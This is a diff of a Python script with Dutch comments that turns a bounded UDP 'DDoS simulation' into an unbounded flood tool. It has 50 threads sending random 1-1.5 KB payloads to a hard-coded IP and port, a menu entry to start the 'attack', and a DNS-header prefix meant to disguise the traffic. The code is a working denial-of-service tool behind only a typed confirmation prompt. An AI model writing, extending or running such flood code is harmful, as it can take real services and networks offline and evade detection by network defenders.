@@ -4,82 +4,87 @@ import time
 import threading
 import random
 import sys
+import signal
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Bevestiging vóór uitvoering
+# CONFIGURATIE
 # ──────────────────────────────────────────────────────────────────────────────
+TARGET_IP = "192.168.160.143"   # Pas aan naar jouw testserver!
+TARGET_PORT = 8080
+NUM_STREAMS = 50                # Minder threads voor stabiliteit
+RATE_PPS = 500                  # Pakketten per seconde per thread
 
-confirm = input("Bevestig dat je in een gecontroleerde omgeving werkt (ja/nee): ")
-if confirm.strip().lower() != "ja":
-    print("[!] Uitvoering geannuleerd. Zorg dat je in een veilige testomgeving zit.")
-    sys.exit(1)
-
-# ──────────────────────────────────────────────────────────────────────────────
-# CONFIGURATIE (HARD‑CODED)
-# ──────────────────────────────────────────────────────────────────────────────
-TARGET_IP        = "192.168.160.141"   # Lokaal IP‑adres van de test‑server
-TARGET_PORT      = 8080            # Doel‑poort
-PACKETS_TOTAL    = 9000            # Totaal aantal pakketten dat je wilt sturen
-RATE_PPS         = 1000             # Totaal pakketten per seconde over alle streams
-NUM_STREAMS      = 120               # Aantal parallelle streams (threads)
-
-# Payload‑grootte range voor randomisatie (in bytes)
 MIN_PAYLOAD_SIZE = 1024
 MAX_PAYLOAD_SIZE = 1500
+CAMOUFLAGE_DNS = True
 
-# Protocol‑camouflage: zet op True om een DNS‑header voor te doen
-CAMOUFLAGE_DNS   = True
-# ──────────────────────────────────────────────────────────────────────────────
+stop_event = threading.Event()
 
-# Bereken per‑thread parameters
-pps_per_thread = RATE_PPS / NUM_STREAMS
+def handle_exit(signum, frame):
+    """Ctrl+C: stop aanval en keer terug naar hoofdmenu."""
+    print("\n[!] DDoS-aanval gestopt. Terug naar hoofdmenu...")
+    stop_event.set()
+    sys.exit(2)  # Speciale exitcode voor hoofdscript
 
-def flood(packets_per_thread: int):
-    """Verstuurt packets_per_thread UDP‑paketten met random payload & timing."""
+signal.signal(signal.SIGINT, handle_exit)
+
+def bevestig_veilige_omgeving():
+    """Dubbele bevestiging voor veiligheid"""
+    confirm = input("Bevestig dat je in een gecontroleerde omgeving werkt (ja/nee): ")
+    if confirm.strip().lower() != "ja":
+        print("[!] Uitvoering geannuleerd. Zorg dat je in een veilige testomgeving zit.")
+        sys.exit(0)
+    print("\n[!] WAARSCHUWING: Dit script kan netwerkverkeer genereren!")
+    print("1) Start aanval")
+    print("99) Terug naar hoofdmenu")
+    keuze = input("Keuze: ")
+    if keuze.strip() != "1":
+        print("[!] Annulering bevestigd. Terug naar hoofdmenu.")
+        sys.exit(0)
+
+def flood():
+    """Verstuurt UDP-pakketten met random payload"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    for _ in range(packets_per_thread):
-        # 1) genereer random payload
-        size = random.randint(MIN_PAYLOAD_SIZE, MAX_PAYLOAD_SIZE)
-        rand_data = bytes(random.getrandbits(8) for _ in range(size))
-
-        # 2) optioneel DNS‑camouflage
-        if CAMOUFLAGE_DNS:
-            header = b'\x00\x00\x01\x00\x00\x01'
-            payload = header + rand_data
-        else:
-            payload = rand_data
-
-        # 3) verstuur
-        try:
-            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
-        except Exception as e:
-            print(f"[!] Fout bij verzenden: {e}")
-
-        # 4) random interval (exponentieel verdeeld)
-        wait = random.expovariate(pps_per_thread)
-        time.sleep(wait)
-
-    sock.close()
+    try:
+        while not stop_event.is_set():
+            size = random.randint(MIN_PAYLOAD_SIZE, MAX_PAYLOAD_SIZE)
+            payload = bytes(random.getrandbits(8) for _ in range(size))
+            if CAMOUFLAGE_DNS:
+                payload = b'\x00\x00\x01\x00\x00\x01' + payload
+            try:
+                sock.sendto(payload, (TARGET_IP, TARGET_PORT))
+                # Debug: toon verzending
+                # print(f"Verzonden {len(payload)} bytes naar {TARGET_IP}:{TARGET_PORT}")
+                if RATE_PPS > 0:
+                    time.sleep(1 / RATE_PPS)
+            except Exception as e:
+                if not stop_event.is_set():
+                    print(f"[!] Fout bij verzenden: {e}")
+                break
+    finally:
+        sock.close()
 
 def main():
-    # Verdeel de totale pakketten gelijk over de streams
-    base = PACKETS_TOTAL // NUM_STREAMS
-    remainder = PACKETS_TOTAL % NUM_STREAMS
+    bevestig_veilige_omgeving()
+    print(f"\n[!] START DDoS SIMULATIE")
+    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
+    print(f"Threads: {NUM_STREAMS}")
+    print(f"Ctrl+C om direct te stoppen\n")
 
     threads = []
-    for i in range(NUM_STREAMS):
-        count = base + (1 if i < remainder else 0)
-        t = threading.Thread(target=flood, args=(count,))
+    for _ in range(NUM_STREAMS):
+        t = threading.Thread(target=flood)
+        t.daemon = True
+        t.start()
         threads.append(t)
 
-    print(f"[*] Start DDoS‑simulatie: {NUM_STREAMS} streams, "
-          f"{PACKETS_TOTAL} pakketten totaal, ~{RATE_PPS} pps")
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
-    print("[*] Simulatie voltooid.")
+    try:
+        while any(t.is_alive() for t in threads) and not stop_event.is_set():
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        handle_exit(None, None)
+
+    print("[!] Simulatie veilig gestopt.")
 
 if __name__ == "__main__":
     main()
